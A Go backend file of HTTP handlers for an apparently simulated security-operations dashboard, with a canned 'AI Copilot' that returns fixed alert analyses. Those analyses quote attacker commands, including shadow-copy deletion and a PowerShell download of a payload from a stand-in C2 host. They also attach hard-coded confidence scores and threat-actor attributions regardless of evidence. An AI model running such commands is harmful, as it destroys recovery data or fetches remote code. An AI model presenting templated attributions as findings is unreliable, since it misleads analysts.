package handlers

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"strings"
	"time"

	"dashboard/backend/models"
	"dashboard/backend/store"
)

// Helper to write JSON response
func writeJSON(w http.ResponseWriter, status int, data interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(data)
}

// GET /api/summary
func GetSummary(w http.ResponseWriter, r *http.Request) {
	store.DB.Mu.RLock()
	defer store.DB.Mu.RUnlock()

	summary := models.DashboardSummary{
		TotalAgents:      len(store.DB.Agents),
		AlertsByCategory: make(map[string]int),
		MitreCoverage:    make(map[string]int),
	}

	for _, a := range store.DB.Agents {
		if a.Status == "active" {
			summary.ActiveAgents++
		} else if a.Status == "alerting" {
			summary.AlertingAgents++
			summary.ActiveAgents++ // Alerting is still active
		}
	}

	summary.AlertCount24h = len(store.DB.Alerts)

	for _, alt := range store.DB.Alerts {
		switch alt.Severity {
		case "critical":
			summary.CriticalAlerts++
		case "high":
			summary.HighAlerts++
		case "medium":
			summary.MediumAlerts++
		case "low":
			summary.LowAlerts++
		}

		summary.AlertsByCategory[alt.Category]++
		if alt.MITRETechnique != "" {
			summary.MitreCoverage[alt.MITRETechnique]++
		}
	}

	// Threat Level Calculation
	if summary.CriticalAlerts > 2 {
		summary.ThreatLevel = "Severe"
	} else if summary.HighAlerts > 3 || summary.CriticalAlerts > 0 {
		summary.ThreatLevel = "Elevated"
	} else {
		summary.ThreatLevel = "Normal"
	}

	writeJSON(w, http.StatusOK, summary)
}

// GET /api/agents
func GetAgents(w http.ResponseWriter, r *http.Request) {
	store.DB.Mu.RLock()
	defer store.DB.Mu.RUnlock()

	agentsList := make([]*models.Agent, 0, len(store.DB.Agents))
	for _, a := range store.DB.Agents {
		agentsList = append(agentsList, a)
	}

	// Sort agents by ID for consistency
	for i := 0; i < len(agentsList)-1; i++ {
		for j := i + 1; j < len(agentsList); j++ {
			if agentsList[i].ID > agentsList[j].ID {
				agentsList[i], agentsList[j] = agentsList[j], agentsList[i]
			}
		}
	}

	writeJSON(w, http.StatusOK, agentsList)
}

// GET /api/agents/:id
func GetAgentDetail(w http.ResponseWriter, r *http.Request) {
	parts := strings.Split(r.URL.Path, "/")
	if len(parts) < 4 {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "Invalid Agent ID"})
		return
	}
	agentID := parts[3]

	store.DB.Mu.RLock()
	defer store.DB.Mu.RUnlock()

	agent, exists := store.DB.Agents[agentID]
	if !exists {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": "Agent not found"})
		return
	}

	// Fetch recent alerts for this agent
	recentAlerts := make([]*models.Alert, 0)
	for _, alt := range store.DB.Alerts {
		if alt.AgentID == agentID {
			recentAlerts = append(recentAlerts, alt)
		}
	}

	// Fetch recent FIM events for this agent
	recentFIM := make([]*models.FIMEvent, 0)
	for _, fim := range store.DB.FIMEvents {
		if fim.AgentID == agentID {
			recentFIM = append(recentFIM, fim)
		}
	}

	response := map[string]interface{}{
		"agent":  agent,
		"alerts": recentAlerts,
		"fim":    recentFIM,
	}

	writeJSON(w, http.StatusOK, response)
}

// GET /api/alerts
func GetAlerts(w http.ResponseWriter, r *http.Request) {
	store.DB.Mu.RLock()
	defer store.DB.Mu.RUnlock()

	severityFilter := r.URL.Query().Get("severity")
	agentFilter := r.URL.Query().Get("agentId")
	statusFilter := r.URL.Query().Get("status")
	searchFilter := strings.ToLower(r.URL.Query().Get("q"))

	filteredAlerts := make([]*models.Alert, 0)

	// Filter in reverse order (newest first)
	for i := len(store.DB.Alerts) - 1; i >= 0; i-- {
		alt := store.DB.Alerts[i]

		if severityFilter != "" && alt.Severity != severityFilter {
			continue
		}
		if agentFilter != "" && alt.AgentID != agentFilter {
			continue
		}
		if statusFilter != "" && alt.Status != statusFilter {
			continue
		}
		if searchFilter != "" {
			match := strings.Contains(strings.ToLower(alt.Title), searchFilter) ||
				strings.Contains(strings.ToLower(alt.Description), searchFilter) ||
				strings.Contains(strings.ToLower(alt.AgentName), searchFilter) ||
				strings.Contains(strings.ToLower(alt.MITRETechnique), searchFilter)
			if !match {
				continue
			}
		}

		filteredAlerts = append(filteredAlerts, alt)
	}

	writeJSON(w, http.StatusOK, filteredAlerts)
}

// GET /api/alerts/:id
func GetAlertDetail(w http.ResponseWriter, r *http.Request) {
	parts := strings.Split(r.URL.Path, "/")
	if len(parts) < 4 {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "Invalid Alert ID"})
		return
	}
	alertID := parts[3]

	store.DB.Mu.RLock()
	defer store.DB.Mu.RUnlock()

	var alert *models.Alert
	for _, alt := range store.DB.Alerts {
		if alt.ID == alertID {
			alert = alt
			break
		}
	}

	if alert == nil {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": "Alert not found"})
		return
	}

	writeJSON(w, http.StatusOK, alert)
}

// POST /api/alerts/:id/analyze
func AnalyzeAlert(w http.ResponseWriter, r *http.Request) {
	parts := strings.Split(r.URL.Path, "/")
	if len(parts) < 4 {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "Invalid Alert ID"})
		return
	}
	alertID := parts[3]

	store.DB.Mu.Lock()
	defer store.DB.Mu.Unlock()

	// Check if already analyzed
	if analysis, exists := store.DB.AIAnalyses[alertID]; exists {
		writeJSON(w, http.StatusOK, analysis)
		return
	}

	var alert *models.Alert
	for _, alt := range store.DB.Alerts {
		if alt.ID == alertID {
			alert = alt
			break
		}
	}

	if alert == nil {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": "Alert not found"})
		return
	}

	// Update status to investigating
	alert.Status = "investigating"

	// Context-aware AI Copilot logic
	analysis := models.AIAnalysis{
		AlertID:    alertID,
		Confidence: 92,
	}

	if strings.Contains(alert.Title, "Ransomware") || alert.MITRETechnique == "T1485" {
		analysis.Summary = "Critical Ransomware activity detected. Shadow copies are being deleted, and files in the administrator directories are being encrypted."
		analysis.ThreatActor = "LockBit 3.0 Affiliate Group"
		analysis.Confidence = 99
		analysis.ImpactRating = "Critical"
		analysis.TechnicalDetail = "The adversary executed 'vssadmin.exe delete shadows' to wipe restore points and prevent system recovery. Immediately following this command, the script identified as 'svchost_cipher.exe' initiated rapid overwrite actions on user directories. A ransom note was generated and system files are being targeted."
		analysis.RemediationSteps = []string{
			"Run Powershell script on host to isolate network adapter: `Disable-NetAdapter -Name \"Ethernet\" -Confirm:$false`",
			"Kill the cryptographic process immediately: `Stop-Process -Name svchost_cipher -Force`",
			"Lock out the compromised Administrator account to prevent domain-wide credential reuse.",
			"Quarantine the malicious binary `C:\\Users\\public\\svchost_cipher.exe` for analysis.",
			"Perform a cold reboot to halt active encryption, then restore files from offline/immutable backups.",
		}
	} else if strings.Contains(alert.Title, "Brute Force") || alert.MITRETechnique == "T1110.001" {
		analysis.Summary = "Successful SSH login after a brute-force attack. Over 150 failed SSH authentication attempts from an external IP followed by a successful login."
		analysis.ThreatActor = "UNC3829 (SSH Botnet Operator)"
		analysis.Confidence = 95
		analysis.ImpactRating = "High"
		analysis.TechnicalDetail = "A distributed botnet conducted dictionary attacks against SSH port 22 on host " + alert.AgentName + ". After multiple failed attempts, a successful login for 'root' was logged from source IP 198.51.100.222, indicating a compromised root credential."
		analysis.RemediationSteps = []string{
			"Isolate SSH access by blocking the attacker's IP: `iptables -A INPUT -s 198.51.100.222 -j DROP`",
			"Immediately change password for user `root`.",
			"Terminate all active SSH sessions for user `root`: `pkill -u root -t pts/0` or similar interfaces.",
			"Disable SSH root login and password authentication: set `PermitRootLogin no` and `PasswordAuthentication no` in `/etc/ssh/sshd_config`, then reload ssh service.",
			"Review command execution history (`~/.bash_history`) for lateral movement commands.",
		}
	} else if strings.Contains(alert.Title, "Lsass") || alert.MITRETechnique == "T1003.001" {
		analysis.Summary = "Credential harvesting attempt detected. Process attempted to dump LSASS memory to extract NT hashes and cleartext passwords."
		analysis.ThreatActor = "APT29 (Cozy Bear)"
		analysis.Confidence = 97
		analysis.ImpactRating = "Critical"
		analysis.TechnicalDetail = "The utility 'mktz.exe' requested permissions to access Local Security Authority Subsystem Service (LSASS) address space. Windows Defender/Sysmon logged access mask 0x1410. This indicates an active attempt to harvest Active Directory domain credentials from RAM."
		analysis.RemediationSteps = []string{
			"Kill the credential dumping process: `taskkill /F /IM mktz.exe`",
			"Enable Windows Defender Credential Guard to prevent memory dumping of LSASS.",
			"Revoke Kerberos Ticket Granting Tickets (TGT) and force a password change for the affected user accounts.",
			"Inspect the Windows Registry keys for persistence: `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`",
			"Isolate the AD Controller from external/internet outbound traffic.",
		}
	} else if strings.Contains(alert.Title, "PowerShell") || alert.MITRETechnique == "T1059" {
		analysis.Summary = "Obfuscated PowerShell script execution. Detection indicates commands running with hidden windows or base64 encoded parameters."
		analysis.ThreatActor = "Adversary Simulation / Script Kiddie"
		analysis.Confidence = 85
		analysis.ImpactRating = "High"
		analysis.TechnicalDetail = "A PowerShell process executed with `-WindowStyle Hidden -EncodedCommand`. Decoding the command reveals a web request downloading a second-stage payload from an external domain: `Invoke-WebRequest -Uri http://malicious-c2.net/payload.ps1`."
		analysis.RemediationSteps = []string{
			"Identify the parent process that spawned PowerShell (typically cmd.exe, wscript.exe, or explorer.exe).",
			"Configure AppLocker or Software Restriction Policies to limit PowerShell execution to signed scripts.",
			"Block outbound TCP connections to the destination domain `malicious-c2.net` at the firewall level.",
			"Examine PowerShell transcript logs (if enabled) in `Documents\\PowerShell_Transcript` for full script actions.",
		}
	} else {
		// Generic fallback
		analysis.Summary = "Suspicious behavior matching MITRE ATT&CK technique " + alert.MITRETechnique + " observed."
		analysis.ThreatActor = "Unknown Threat Group"
		analysis.Confidence = 70
		analysis.ImpactRating = "Medium"
		analysis.TechnicalDetail = "System audit logs on agent " + alert.AgentName + " recorded events matching rule " + alert.RuleID + ". Rule description: " + alert.Description + ". Logs show anomalies in service execution or file updates."
		analysis.RemediationSteps = []string{
			"Inspect system log entries around the incident window: " + alert.Timestamp.Format(time.RFC3339),
			"Verify if this activity aligns with any scheduled administrative tasks or system upgrades.",
			"Monitor host CPU, RAM, and outgoing network connections for subsequent indicators of compromise.",
			"Mark this alert as resolved if it is verified as authorized maintenance.",
		}
	}

	store.DB.AIAnalyses[alertID] = &analysis
	writeJSON(w, http.StatusOK, analysis)
}

// GET /api/fim
func GetFimEvents(w http.ResponseWriter, r *http.Request) {
	store.DB.Mu.RLock()
	defer store.DB.Mu.RUnlock()

	agentFilter := r.URL.Query().Get("agentId")
	eventFilter := r.URL.Query().Get("event")

	filteredFIM := make([]*models.FIMEvent, 0)
	for i := len(store.DB.FIMEvents) - 1; i >= 0; i-- {
		fim := store.DB.FIMEvents[i]

		if agentFilter != "" && fim.AgentID != agentFilter {
			continue
		}
		if eventFilter != "" && fim.EventType != eventFilter {
			continue
		}

		filteredFIM = append(filteredFIM, fim)
	}

	writeJSON(w, http.StatusOK, filteredFIM)
}

// GET /api/logs
func GetLogs(w http.ResponseWriter, r *http.Request) {
	store.DB.Mu.RLock()
	defer store.DB.Mu.RUnlock()

	searchQuery := strings.ToLower(r.URL.Query().Get("q"))
	agentFilter := r.URL.Query().Get("agentId")
	facilityFilter := r.URL.Query().Get("facility")

	filteredLogs := make([]*models.LogEntry, 0)

	// Search matching logs
	for i := len(store.DB.Logs) - 1; i >= 0; i-- {
		log := store.DB.Logs[i]

		if agentFilter != "" && log.AgentID != agentFilter {
			continue
		}
		if facilityFilter != "" && log.Facility != facilityFilter {
			continue
		}
		if searchQuery != "" {
			match := strings.Contains(strings.ToLower(log.Message), searchQuery) ||
				strings.Contains(strings.ToLower(log.Facility), searchQuery) ||
				strings.Contains(strings.ToLower(log.AgentName), searchQuery) ||
				strings.Contains(strings.ToLower(log.Severity), searchQuery)
			if !match {
				continue
			}
		}

		filteredLogs = append(filteredLogs, log)
	}

	// Compute time histogram for the filtered logs
	// We divide the last 2 hours into 10 intervals of 12 minutes
	now := time.Now()
	interval := 12 * time.Minute
	histBuckets := make([]map[string]interface{}, 10)

	for i := 0; i < 10; i++ {
		tBucket := now.Add(time.Duration(-9+i) * interval)
		histBuckets[i] = map[string]interface{}{
			"time":  tBucket.Format("15:04"),
			"count": 0,
		}
	}

	for _, log := range filteredLogs {
		diff := now.Sub(log.Timestamp)
		if diff > 120*time.Minute || diff < 0 {
			continue
		}
		bucketIdx := 9 - int(diff/interval)
		if bucketIdx >= 0 && bucketIdx < 10 {
			histBuckets[bucketIdx]["count"] = histBuckets[bucketIdx]["count"].(int) + 1
		}
	}

	// Pagination (limit to latest 100 logs in the list)
	listLimit := 100
	if len(filteredLogs) > listLimit {
		filteredLogs = filteredLogs[:listLimit]
	}

	response := map[string]interface{}{
		"logs":      filteredLogs,
		"histogram": histBuckets,
	}

	writeJSON(w, http.StatusOK, response)
}

// POST /api/simulate
func TriggerSimulation(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSON(w, http.StatusMethodNotAllowed, map[string]string{"error": "Method not allowed"})
		return
	}

	var req struct {
		AgentID string `json:"agentId"`
		Type    string `json:"type"` // ransomware, bruteforce, malware
	}

	err := json.NewDecoder(r.Body).Decode(&req)
	if err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "Invalid request body"})
		return
	}

	if req.AgentID == "" || req.Type == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "agentId and type are required"})
		return
	}

	alertID := store.DB.SimulateAttack(req.AgentID, req.Type)
	if alertID == "Agent not found" {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": "Agent not found"})
		return
	}
	if alertID == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "Unknown simulation type"})
		return
	}

	// Return the triggered alert details
	var alert *models.Alert
	store.DB.Mu.RLock()
	for _, alt := range store.DB.Alerts {
		if alt.ID == alertID {
			alert = alt
			break
		}
	}
	store.DB.Mu.RUnlock()

	writeJSON(w, http.StatusOK, map[string]interface{}{
		"message": "Simulation triggered successfully",
		"alertId": alertID,
		"alert":   alert,
	})
}

// PUT /api/alerts/:id/resolve
func ResolveAlert(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost && r.Method != http.MethodPut {
		writeJSON(w, http.StatusMethodNotAllowed, map[string]string{"error": "Method not allowed"})
		return
	}

	parts := strings.Split(r.URL.Path, "/")
	if len(parts) < 4 {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "Invalid Alert ID"})
		return
	}
	alertID := parts[3]

	store.DB.Mu.Lock()
	defer store.DB.Mu.Unlock()

	var alert *models.Alert
	for _, alt := range store.DB.Alerts {
		if alt.ID == alertID {
			alert = alt
			break
		}
	}

	if alert == nil {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": "Alert not found"})
		return
	}

	alert.Status = "resolved"

	// Resolve agent status if no other high/critical open alerts exist for this agent
	agentID := alert.AgentID
	hasOtherCriticals := false
	for _, alt := range store.DB.Alerts {
		if alt.AgentID == agentID && alt.ID != alertID && alt.Status != "resolved" && (alt.Severity == "high" || alt.Severity == "critical") {
			hasOtherCriticals = true
			break
		}
	}

	if !hasOtherCriticals {
		if agent, exists := store.DB.Agents[agentID]; exists {
			agent.Status = "active"
		}
	}

	writeJSON(w, http.StatusOK, map[string]interface{}{
		"message": "Alert marked as resolved",
		"alert":   alert,
	})
}

// PUT /api/alerts/:id/assign
func AssignAlert(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost && r.Method != http.MethodPut {
		writeJSON(w, http.StatusMethodNotAllowed, map[string]string{"error": "Method not allowed"})
		return
	}

	parts := strings.Split(r.URL.Path, "/")
	if len(parts) < 4 {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "Invalid Alert ID"})
		return
	}
	alertID := parts[3]

	var req struct {
		Assignee string `json:"assignee"`
	}
	err := json.NewDecoder(r.Body).Decode(&req)
	if err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "Invalid request body"})
		return
	}

	store.DB.Mu.Lock()
	defer store.DB.Mu.Unlock()

	var alert *models.Alert
	for _, alt := range store.DB.Alerts {
		if alt.ID == alertID {
			alert = alt
			break
		}
	}

	if alert == nil {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": "Alert not found"})
		return
	}

	alert.Assignee = req.Assignee
	if req.Assignee != "" && alert.Status == "open" {
		alert.Status = "investigating"
	}

	writeJSON(w, http.StatusOK, map[string]interface{}{
		"message": "Alert assignee updated",
		"alert":   alert,
	})
}

// POST /api/alerts/bulk-resolve
func BulkResolveAlerts(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSON(w, http.StatusMethodNotAllowed, map[string]string{"error": "Method not allowed"})
		return
	}

	var req struct {
		IDs []string `json:"ids"`
	}
	err := json.NewDecoder(r.Body).Decode(&req)
	if err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "Invalid request body"})
		return
	}

	store.DB.Mu.Lock()
	defer store.DB.Mu.Unlock()

	resolvedCount := 0
	affectedAgents := make(map[string]bool)

	for _, id := range req.IDs {
		for _, alt := range store.DB.Alerts {
			if alt.ID == id {
				alt.Status = "resolved"
				affectedAgents[alt.AgentID] = true
				resolvedCount++
				break
			}
		}
	}

	// For each affected agent, re-verify if their status should go back to "active"
	for agentID := range affectedAgents {
		hasOtherCriticals := false
		for _, alt := range store.DB.Alerts {
			if alt.AgentID == agentID && alt.Status != "resolved" && (alt.Severity == "high" || alt.Severity == "critical") {
				hasOtherCriticals = true
				break
			}
		}
		if !hasOtherCriticals {
			if agent, exists := store.DB.Agents[agentID]; exists {
				agent.Status = "active"
			}
		}
	}

	writeJSON(w, http.StatusOK, map[string]interface{}{
		"message":       "Alerts resolved in bulk",
		"resolvedCount": resolvedCount,
	})
}

// POST /api/alerts/bulk-assign
func BulkAssignAlerts(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSON(w, http.StatusMethodNotAllowed, map[string]string{"error": "Method not allowed"})
		return
	}

	var req struct {
		IDs      []string `json:"ids"`
		Assignee string   `json:"assignee"`
	}
	err := json.NewDecoder(r.Body).Decode(&req)
	if err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "Invalid request body"})
		return
	}

	store.DB.Mu.Lock()
	defer store.DB.Mu.Unlock()

	assignedCount := 0
	for _, id := range req.IDs {
		for _, alt := range store.DB.Alerts {
			if alt.ID == id {
				alt.Assignee = req.Assignee
				if req.Assignee != "" && alt.Status == "open" {
					alt.Status = "investigating"
				}
				assignedCount++
				break
			}
		}
	}

	writeJSON(w, http.StatusOK, map[string]interface{}{
		"message":       "Alerts assigned in bulk",
		"assignedCount": assignedCount,
	})
}

// GET /api/actions
func GetActions(w http.ResponseWriter, r *http.Request) {
	if store.UsePostgres {
		rows, err := store.SQL.Query("SELECT id, timestamp, actor, action_type, target, status, message FROM action_logs ORDER BY timestamp DESC")
		if err != nil {
			log.Printf("[DATABASE ERROR] Failed to fetch action logs from PostgreSQL: %v", err)
			writeJSON(w, http.StatusInternalServerError, map[string]string{"error": "Database read error"})
			return
		}
		defer rows.Close()

		actionsList := make([]*models.ActionLog, 0)
		for rows.Next() {
			var act models.ActionLog
			var ts time.Time
			err := rows.Scan(&act.ID, &ts, &act.Actor, &act.ActionType, &act.Target, &act.Status, &act.Message)
			if err != nil {
				log.Printf("[DATABASE ERROR] Scan action log row failed: %v", err)
				continue
			}
			act.Timestamp = ts
			actionsList = append(actionsList, &act)
		}
		writeJSON(w, http.StatusOK, actionsList)
		return
	}

	store.DB.Mu.RLock()
	defer store.DB.Mu.RUnlock()

	// Return a copy sorted descending by timestamp
	length := len(store.DB.ActionLogs)
	actionsList := make([]*models.ActionLog, length)
	for i, act := range store.DB.ActionLogs {
		actionsList[length-1-i] = act
	}

	writeJSON(w, http.StatusOK, actionsList)
}

// POST /api/actions
func PerformAction(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSON(w, http.StatusMethodNotAllowed, map[string]string{"error": "Method not allowed"})
		return
	}

	var req struct {
		Actor      string `json:"actor"`
		ActionType string `json:"actionType"`
		Target     string `json:"target"`
		Message    string `json:"message"`
	}

	err := json.NewDecoder(r.Body).Decode(&req)
	if err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "Invalid request body"})
		return
	}

	if req.ActionType == "" || req.Target == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "actionType and target are required"})
		return
	}

	// Resolve the actual operator from cookie/bearer token to prevent spoofing
	cookie, err := r.Cookie("session_token")
	var sessionToken string
	if err == nil {
		sessionToken = cookie.Value
	} else {
		authHeader := r.Header.Get("Authorization")
		if strings.HasPrefix(authHeader, "Bearer ") {
			sessionToken = strings.TrimPrefix(authHeader, "Bearer ")
		}
	}

	var sessionUsername string
	var sessionExists bool

	if sessionToken != "" {
		if store.UsePostgres {
			_, dbUsername, _, dbExpiresAt, dbErr := store.GetSQLSession(sessionToken)
			if dbErr == nil && time.Now().Before(dbExpiresAt) {
				sessionUsername = dbUsername
				sessionExists = true
			}
		} else {
			authMu.RLock()
			session, ok := sessionStore[sessionToken]
			if ok && time.Now().Before(session.ExpiresAt) {
				sessionUsername = session.Username
				sessionExists = true
			}
			authMu.RUnlock()
		}
	}

	var resolvedActor string
	if sessionExists {
		resolvedActor = fmt.Sprintf("SOC (%s)", sessionUsername)
	} else {
		// Fallback for AI/Simulators (non-human background actions)
		resolvedActor = req.Actor
		if resolvedActor == "" {
			resolvedActor = "System"
		}
	}

	store.DB.Mu.Lock()
	defer store.DB.Mu.Unlock()

	store.DB.ActionCounter++
	actionID := fmt.Sprintf("act-%04d", store.DB.ActionCounter)

	status := "success"
	detailMsg := req.Message
	if detailMsg == "" {
		detailMsg = fmt.Sprintf("Manual action completed successfully.")
	}

	// Apply side effects to simulation targets
	if req.ActionType == "Isolate Host" {
		for _, a := range store.DB.Agents {
			if a.Name == req.Target || a.ID == req.Target {
				a.Status = "disconnected"
				detailMsg = fmt.Sprintf("Host %s has been isolated from the network. Local interfaces disabled.", a.Name)
				break
			}
		}
	} else if req.ActionType == "Block IP" {
		detailMsg = fmt.Sprintf("Outbound and inbound traffic to IP %s blocked at firewall edge.", req.Target)
	} else if req.ActionType == "Terminate Process" {
		detailMsg = fmt.Sprintf("Process successfully terminated on destination agent.")
	} else if req.ActionType == "Revoke Credentials" {
		detailMsg = fmt.Sprintf("Credentials revoked for user account %s in Active Directory.", req.Target)
	}

	actionLog := &models.ActionLog{
		ID:         actionID,
		Timestamp:  time.Now(),
		Actor:      resolvedActor,
		ActionType: req.ActionType,
		Target:     req.Target,
		Status:     status,
		Message:    detailMsg,
	}

	// Save to DB or in-memory
	if store.UsePostgres {
		_, dbErr := store.SQL.Exec(`
			INSERT INTO action_logs (id, timestamp, actor, action_type, target, status, message)
			VALUES ($1, $2, $3, $4, $5, $6, $7)
		`, actionID, actionLog.Timestamp, actionLog.Actor, actionLog.ActionType, actionLog.Target, actionLog.Status, actionLog.Message)
		if dbErr != nil {
			log.Printf("[DATABASE ERROR] Failed to save action log to PostgreSQL: %v", dbErr)
		}
	}

	store.DB.ActionLogs = append(store.DB.ActionLogs, actionLog)

	writeJSON(w, http.StatusOK, actionLog)
}

